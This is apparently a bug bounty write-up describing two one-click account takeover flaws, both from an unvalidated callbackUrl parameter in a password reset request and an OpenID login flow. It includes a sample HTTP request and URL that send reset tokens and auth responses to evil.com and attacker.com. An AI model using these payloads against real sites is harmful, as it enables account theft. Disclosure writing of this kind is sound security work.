# How a Single Parameter Led to Two ATO Cases

**Published:** May 18, 2024

Hey guys, Today, I'm excited to share an intriguing story about how a **single parameter** in an application led to two account takeover cases and earned me a **four-digit bounty**. The program is a private one on HackerOne, and I was among the first few hackers to get invited. I'll explain two bugs I found here. Both account takeover (**ATO**) cases are one-click exploits, meaning the victim only needed to perform a single interaction.

![Excited GIF](/images/excited.gif)

## Weakness in the Password Reset Functionality

I was testing the password reset functionality of this application and discovered an interesting parameter called `CallbackUrl` from the password reset request.

```http
POST /auth/resetpassword HTTP/2
Host: api.example.com
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
Origin: https://app.example.com
Referer: https://app.example.com

{"Email":"victim@example.com","CallbackUrl":"https://evil.com/auth/reset-password"}
```

When a user requests a password reset link, the server sends a request to the specified email with a password reset link that contains a token. However, I discovered that if an attacker changes the request parameter `CallbackUrl` to a domain that they control, the password reset link will be sent like `attacker.domain.com/auth/reset-password?token=token` to the user's email. **This means that the attacker can obtain the password reset token when the user clicks the link and use it to take over the user's account.**

![Password Reset Flow](/images/password-reset-flow.png)

**I reported the issues, and they marked the report as high severity and rewarded me with a $$$$ digit bounty.**

![Happy GIF](/images/happy.gif)

This discovery sparked my curiosity to dig deeper into the platform. I searched the application JavaScript for corresponding parameters and found that the same parameter is used in the **application's OAuth flow**.

## Account Takeover via Misconfigured OpenID

During my testing on the **OAuth** mechanism of the application, I got another security flaw that could potentially lead to One click account takeover. This vulnerability stems from a misconfiguration in the **OpenID** implementation, specifically in the `callbackUrl` parameter used in the authentication flow with various identity providers.

I discovered that an attacker could exploit this misconfiguration by manipulating the `callbackUrl` parameter by redirecting it to an attacker-controlled domain, malicious actors could intercept the authentication process and potentially gain unauthorized access to user accounts.

**For example:**

- Google: `https://api.example.net/openid/google?callbackUrl=https://attacker.com/auth/register`

Initiating the authentication process with the respective provider results in the authentication response being redirected to the **attacker's domain**.

Exploiting this vulnerability allows attackers to intercept authentication responses, potentially obtaining access tokens. The authentication response is redirected to the **attacker-controlled domain** specified in the modified `callbackUrl` parameter.

After reporting the issue, the team responded by explaining that they considered the reported vulnerability as part of the **previous** `callbackUrl` **fix**. They emphasized that their policy only allows for one bounty payment per bug and considered **duplicates** unacceptable. Despite their explanation, I reiterated my findings, emphasizing that the vulnerability persisted specifically in the `callbackUrl` of the Auth0 endpoint. I acknowledged their efforts in resolving the previous bug but urged them to consider this as a separate issue due to its potential risk of account takeover.

![HackerOne Discussion](/images/hackerone-discussion.png)

Following internal discussions, the team ultimately recognized the severity of the vulnerability and awarded me another **$$$$ digit bounty along with an exclusive swag pack** as a token of appreciation for bringing it to their attention.

![Success GIF](/images/success.gif)

**Thanks for taking the time to read through the write-up, and stay tuned for more insights and discoveries in the future**